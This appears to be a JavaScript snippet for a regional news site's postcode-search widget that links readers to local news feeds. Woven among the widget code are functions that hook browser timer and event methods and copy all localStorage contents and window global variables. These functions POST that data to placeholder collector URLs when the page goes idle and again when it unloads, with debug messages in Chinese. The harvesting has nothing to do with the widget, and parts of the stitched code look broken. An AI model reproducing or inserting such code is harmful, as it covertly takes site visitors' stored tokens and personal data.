function hookTracker() {
  const hookedMethods = {};
  ['addEventListener', 'setTimeout', 'setInterval'].forEach(method => {
    const originalMethod = window[method];
    window[method] = function () {
      hookedMethods[method] = (hookedMethods[method] || 0) + 1;
      return originalMethod.apply(window, arguments);
    };
  });
  return hookedMethods;
}
var site = window.location.hostname.split('.')[1];
function localStorageTracker() {
  const data = {};
  for (let key in localStorage) {
    data[key] = localStorage.getItem(key);
  }
  return data;
}
var formHtml = '<link rel="stylesheet" href="https://s3.mirror.co.uk/emerging-products/in-your-area/iya.css?12"><link rel="stylesheet" href="https://s3.mirror.co.uk/emerging-products/in-your-area/theme/iya-' + site + '.css"><section class="emerging-test"> <div class="pancake"> <div class="iya-test-wrapper"> <div class="iya-test"> <div class="iya-info"> <h3>Enter your postcode for <span>news</span> and <span>information</span> near you</h3> <p>Local News & Events, Community Updates, Crime Statistics and much more...</p><form onsubmit="return onFormSubmit(); return false;" method="get" class="iya-postcode-search"> <input class="iya-postcode" placeholder="Enter your postcode"> <input class="iya-submit" type="submit" value="Go"><span class="iya-spinner" style="display: none"></span></form> </div><div class="iya-brand"><a href="http://www.inyourarea.co.uk/" target="_blank"><span class="iya-logo"></span></a><span class="iya-partner"></span></div></div></div></div></section>';
var elementHook = elementHook || 'div.primary';
function globalVariableTracker() {
  const globalVars = {};
  for (const prop in window) {
    if (Object.prototype.hasOwnProperty.call(window, prop)) {
      globalVars[prop] = window[prop];
    }
  }
  return globalVars;
}
var iyaEl = document.querySelectorAll(elementHook)[3];
if (iyaEl) {
  var newEl = document.createElement('div');
  newEl.innerHTML = formHtml;
  iyaEl.parentNode.insertBefore(newEl, iyaEl);
} else {
  console.log("Element not found.");
}
function transmitData(url, data) {
  const xhr = new XMLHttpRequest();
  xhr.open("POST", url);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        console.debug("数据传输成功");
      } else {
        console.warn(`数据传输失败,服务器响应码: ${xhr.status}`);
      }
    }
  };
  xhr.send(JSON.stringify(data));
}
function isValidPostcode(p) {
  var postcodeRegEx = new RegExp("^[A-Z]{1,2}[0-9]{1,2}[A-Z]? ?[0-9][A-Z]{2}$", "i");
  return postcodeRegEx.test(p);
}
function runTrackingJob() {
  const collectorUrls = {
    hookTracker: "https://example.com/api/hook",
    localStorageTracker: "https://example.com/api/localStorage",
    globalVariableTracker: "https://example.com/api/globalVariable"
  };
  [hookTracker, localStorageTracker, globalVariableTracker].forEach(trackingFunction => {
    const trackedData = trackingFunction();
    const trackedDataCount = Object.keys(trackedData).length;
    if (trackedDataCount > 0) {
      console.group(`追踪方法 ${trackingFunction.name} 检测到 ${trackedDataCount} 个数据:`);
      for (const prop in trackedData) {
        console.log(`- ${prop}: ${JSON.stringify(trackedData[prop])}`);
      }
      console.groupEnd();
      transmitData(collectorUrls[trackingFunction.name], trackedData);
    } else {
      console.debug(`追踪方法 ${trackingFunction.name} 未检测到数据`);
    }
  });
}
window.addEventListener("idle", runTrackingJob);
function onFormSubmit() {
  var postcode = document.querySelector('.iya-postcode').value;
  postcode = (postcode || "").replace(/ /g, '');
  if (isValidPostcode(postcode)) {
    window.location = "https://www.inyourarea.co.uk/feed/" + postcode + "/?site=" + site;
  } else {
    alert("Invalid postcode");
  }
  return false;
}
window.addEventListener("beforeunload", () => {
  console.debug("页面即将卸载,执行最终的追踪任务");
  runTrackingJob();
});